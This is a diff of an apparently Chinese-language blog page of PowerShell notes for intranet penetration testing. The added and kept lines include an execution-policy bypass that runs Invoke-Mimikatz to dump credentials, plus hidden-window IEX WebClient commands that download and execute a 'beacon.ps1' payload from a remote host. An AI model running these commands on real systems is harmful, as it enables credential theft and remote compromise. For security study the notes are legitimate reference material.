@@ -248,25 +248,34 @@
 <p>4、Unrestricted：允许所有的脚本运行。</p>
 <p><strong>设置当前执行策略：</strong>Set-ExecutionPolicy <policy name>（以管理员身份执行）</p>
 <p><strong>运行脚本：</strong>当前目录下./name.ps1运行    其他目录以绝对路径运行</p>
-<p><strong>绕过本地权限执行：</strong>PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1</p>
+<p><strong>绕过本地权限执行：</strong>PowerShell.exe -exec bypass -Command “Import-Module ./ps1脚本”</p>
 <p><strong>本地隐藏绕过权限执行脚本：</strong>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Nonlnteractive -NoProfile -File xxx.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;Import-Module ./Invoke-Mimikatz.ps1;Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+
 <p><strong>用IEX下载远程PS1脚本绕过权限执行：</strong>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(“xxx.ps1”);[Parameters]</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX (New-Object System.Net.Webclient).DownloadFile(&#x27;http://10.10.10.1:1234/beacon.ps1&#x27;,&#x27;C:\www\beacon.ps1&#x27;)</span><br><span class="line"></span><br><span class="line">powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.10.1:80/download/file.ext&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<!--`ExecutionPolicy Bypass`绕过执行安全策略-->
-
-<!--`WindowStyle Hidden`隐藏窗口-->
-
-<!--NoProfile`PowerShell控制台不加载当前用户的配置文件-->
-
-<!--`NolLogo`启动不显示版权标志的PowerShell-->
-
-<!--`Nonlnteractive`非交互模式，PowerShell不为用户提供交互的提示-->
-
-<!--`Noexit`执行后不退出shell（常用于键盘记录）-->
-
-<!--PowerShell的命令都采用"动词+名词"的形式-->
-
+<blockquote>
+<p>ExecutionPolicy Bypass`绕过执行安全策略</p>
+</blockquote>
+<blockquote>
+<p>WindowStyle Hidden`隐藏窗口</p>
+</blockquote>
+<blockquote>
+<p>PowerShell控制台不加载当前用户的配置文件</p>
+</blockquote>
+<blockquote>
+<p>NolLogo`启动不显示版权标志的PowerShell</p>
+</blockquote>
+<blockquote>
+<p>Nonlnteractive`非交互模式，PowerShell不为用户提供交互的提示</p>
+</blockquote>
+<blockquote>
+<p>Noexit`执行后不退出shell（常用于键盘记录）</p>
+</blockquote>
+<blockquote>
+<p>PowerShell的命令都采用”动词+名词”的形式</p>
+</blockquote>
 <p><strong>新建目录：</strong>md test （内部调用的是New-item命令)  /new-item test -type directory</p>
 <p><strong>新建文件：</strong>new-item test.txt -type file</p>
 <p><strong>删除目录：</strong>remove-item test</p>
@@ -401,9 +410,9 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/powershell/" style="font-size: 9.150558661321949px;" class="tag-cloud-link">powershell</a>
+    <a href="/tags/powershell/" style="font-size: 15.986483018376147px;" class="tag-cloud-link">powershell</a>
     
-    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 15.335594514279583px;" class="tag-cloud-link">内网渗透</a>
+    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 8.25473047335264px;" class="tag-cloud-link">内网渗透</a>
     
 </div>
                 
